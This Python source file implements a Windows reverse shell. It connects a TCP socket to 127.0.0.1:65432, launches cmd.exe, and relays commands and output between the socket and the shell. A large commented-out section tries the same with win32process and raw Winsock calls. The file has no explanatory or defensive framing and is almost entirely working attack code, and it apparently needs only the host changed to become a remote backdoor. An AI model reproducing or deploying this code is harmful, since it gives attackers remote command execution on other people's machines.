# import win32process
# import ctypes
# import socket
# import sys
#
# # class sockaddr(ctypes.Structure):
# #     _fields_ = [
# #         ("dwSize", ctypes.c_ulong),
# #         ("cntUsage", ctypes.c_ulong),
# #         ("th32ProcessID", ctypes.c_ulong),
# #         ("th32DefaultHeapID", ctypes.c_ulong),
# #         ("th32ModuleID", ctypes.c_ulong),
# #         ("cntThreads", ctypes.c_ulong),
# #         ("th32ParentProcessID", ctypes.c_ulong),
# #         ("pcPriClassBase", ctypes.c_ulong),
# #         ("dwFlags", ctypes.c_ulong),
# #         ("szExeFile", 260*ctypes.c_char)
# #     ]
#
#
# CMD_PATH = "C:\WINDOWS\system32\cmd.exe"
# # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# # s.connect(("127.0.0.1", 65432))
# # descriptor = s.fileno()
# STARTUP_INFO = win32process.STARTUPINFO()
# STARTUP_INFO.dwFlags = win32process.STARTF_USESTDHANDLES
# s = sys.stdout.fileno()
# i = sys.stdin.fileno()
# e = sys.stderr.fileno()
# STARTUP_INFO.hStdInput = i
# STARTUP_INFO.hStdOutput = s
# STARTUP_INFO.hStdError = e
# hProcess, hThread, dwProcessId, dwThreadId = win32process.CreateProcess(CMD_PATH, None, None, None, 1, 0, None, None, STARTUP_INFO)
# print(win32process.GetProcessId(hProcess))
#
# # STARTUP_INFO = win32process.STARTUPINFO()
# # # load dll using ctypes
# # winsock32 = ctypes.windll.Ws2_32
# #
# # # socket :: IPV4 : AF_INET : 2, TCP : SOCK_STREAM : 1, TCP : IPPROTO_TCP : 6
# # socket = winsock32.socket(2, 1, 6)
# # winsock32.connect(socket, )
import threading
def receive(sock, proc):
    while True:
        data = sock.recv(1024)
        print(f"Got data: {data.decode()}")
        proc.stdin.write(data)
        p.stdin.flush()
        proc.stdin.write("\n".encode())
        p.stdin.flush()
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 65432))
import subprocess
p = subprocess.Popen("cmd.exe", stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell=False)
thread = threading.Thread(target=receive, args=(s, p,))
thread.start()
while p.poll() is None:
    n = p.stdout.readline()
    print(n)
    s.send(n)